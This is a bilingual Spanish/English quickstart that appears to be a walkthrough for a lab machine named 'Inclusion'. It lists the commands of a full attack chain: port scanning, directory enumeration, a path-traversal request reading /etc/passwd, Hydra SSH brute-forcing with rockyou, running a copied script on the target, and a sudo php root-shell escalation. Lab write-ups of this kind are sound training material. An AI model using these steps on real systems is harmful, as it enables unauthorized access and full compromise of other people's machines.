# Quickstart — Inclusion (Bilingual)

## Para Comenzar (Español) 🚀

Requisitos: VM/servicio desplegado y herramientas: `nmap`, `gobuster`, `hydra`, `ssh`, `scp`, `rockyou.txt`.

Pasos críticos (5 pasos — ≤2 minutos):

1. Escanear puertos y detectar servicios:

```bash
nmap -sCV -p- -oA nmap_scan <objetivo>  
```
Nota: -T4 se usa, pero en entornos relaes no se recomienda.

2. Enumerar directorios web rápidos:

```bash
gobuster dir -u http://<objetivo>/ -w /path/to/wordlist.txt -t 50 
```

3. Probar inclusión de archivos detectada (ejemplo):

```
http://<objetivo>/shop/?archivo=/../../../etc/passwd
```

4. Si `/etc/passwd` se muestra, identificar usuarios y realizar fuerza bruta contra SSH:

```bash
hydra -l <usuario> -P rockyou.txt ssh://<objetivo> -t 4 -f
```

5. Acceder por SSH, transferir herramientas si hace falta y revisar `sudo -l`:

```bash
scp script.sh user@<objetivo>:/tmp/ && scp rockyou.txt user@<objetivo>:/tmp/ && ssh user@<objetivo> "chmod +x /tmp/script.sh && /tmp/script.sh"

sudo -l
# Si existe ejecución de intérpretes sin contraseña:
sudo php -r "system('/bin/bash');"
```
---

## Quick Start Guide (English) 🚀

Requirements: Deployed lab VM/service and tools: `nmap`, `gobuster`, `hydra`, `ssh`, `scp`, `rockyou.txt`.

Critical steps (5 steps — ≤2 minutes):

1. Port scan and service detection:

```bash
nmap -sC -sV -p- -oA nmap_scan <target>  
```
Note: -T4 flag is used, but it's not usefull in real enviroments.

2. Fast web directory enumeration:

```bash
gobuster dir -u http://<target>/ -w /path/to/wordlist.txt -t 50 -o gobuster.txt
```

3. Test file inclusion (example):

```
http://<target>/shop/?archivo=/../../../etc/passwd
```

4. If `/etc/passwd` is returned, enumerate usernames and brute-force SSH:

```bash
hydra -l <user> -P rockyou.txt ssh://<target> -t 4 -f
```

5. SSH in, transfer tools if needed and check `sudo -l`:

```bash
scp script.sh user@<objetivo>:/tmp/ && scp rockyou.txt user@<objetivo>:/tmp/ && ssh user@<target> "chmod +x /tmp/script.sh && /tmp/script.sh"
sudo -l
# If passwordless interpreter execution is allowed:
sudo php -r "system('/bin/bash');"
```